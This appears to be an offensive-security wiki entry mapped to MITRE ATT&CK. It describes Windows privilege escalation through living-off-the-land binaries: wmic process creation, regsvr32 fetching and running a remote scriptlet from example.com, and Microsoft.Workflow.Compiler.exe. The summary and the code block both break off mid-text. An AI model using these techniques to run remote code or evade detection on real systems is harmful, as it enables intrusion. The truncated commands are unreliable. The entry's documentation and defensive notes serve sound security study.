---
id: 6dab44c0-27f0-4e4d-948d-7f3208517d35
name: Windows - EoP with Living Off The Land Binaries and Scripts
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.072431+00:00'
updated_at: '2023-04-10T20:37:55.298034+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Indirect Command Execution|T1202 - Indirect Command Execution]]'
tags:
- '[[EoP - Living Off The Land Binaries and Scripts]]'
- '[[Windows - Privilege Escalation]]'
---

# Windows - EoP with Living Off The Land Binaries and Scripts

## Summary

This procedure focuses on using Living Off The Land Binaries and Scripts to escalate privileges on a Windows system. This technique involves using legitimate system utilities and tools to execute malicious code. By doing so, it can evade detection from security solutions that rely on blacklisting k

## Description

# Description

This procedure focuses on using Living Off The Land Binaries and Scripts to escalate privileges on a Windows system. This technique involves using legitimate system utilities and tools to execute malicious code. By doing so, it can evade detection from security solutions that rely on blacklisting known malicious binaries. The attacker can leverage these tools to gain higher privileges and access sensitive data or systems.

Technical Explanation: The attacker can use a variety of Living Off The Land Binaries and Scripts to escalate privileges on a Windows system. These can include tools such as PowerShell, Certutil, and Bitsadmin, among others. The attacker can use these tools to download and execute malicious code, create new user accounts, modify system settings, and more. By doing so, they can gain higher privileges and access sensitive data or systems.

Business Value: This procedure can be used by attackers to gain access to sensitive data or systems, which can lead to data theft, financial loss, or reputational damage. By using Living Off The Land Binaries and Scripts, the attacker can evade detection from security solutions and maintain persistence on the system.

 

## Requirements

1. Access to a Windows system

1. Knowledge of Living Off The Land Binaries and Scripts

1. Ability to execute malicious code

 

## Defense

1. Implement least privilege access control to limit the impact of privilege escalation

1. Monitor for suspicious activity related to Living Off The Land Binaries and Scripts

1. Use security solutions that can detect and prevent the use of Living Off The Land Binaries and Scripts

 

## Objectives

1. Escalate privileges on a Windows system

1. Gain access to sensitive data or systems

 

# Instructions

1. This command executes malicious code on the target system. The 'wmic.exe process call create' command is used to create a new process for the 'calc' application, which can be replaced with any other executable. The 'regsvr32' command is used to register a DLL and execute its code. In this case, the DLL is downloaded from a remote server using the 'http://example.com/file.sct' URL. The 'Microsoft.Workflow.Compiler.exe' command is used to execute a workflow file, which can also contain malicious code.

 



**Code**: [[wmic.exe process call create calc
regsvr32 /s /n /]]



> The 'wmic.exe process call create' command takes the name of the executable to run as an argument. The 'regsvr32' command takes several arguments: '/s' to run in silent mode, '/n' to not call DllRegisterServer, '/u' to unregister a DLL, and '/i' to specify the URL of the script to execute. The 'Microsoft.Workflow.Compiler.exe' command takes the name of the input workflow file and the name of the output file as arguments.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Indirect Command Execution|T1202 - Indirect Command Execution]]

## Tags

- [[EoP - Living Off The Land Binaries and Scripts]]
- [[Windows - Privilege Escalation]]


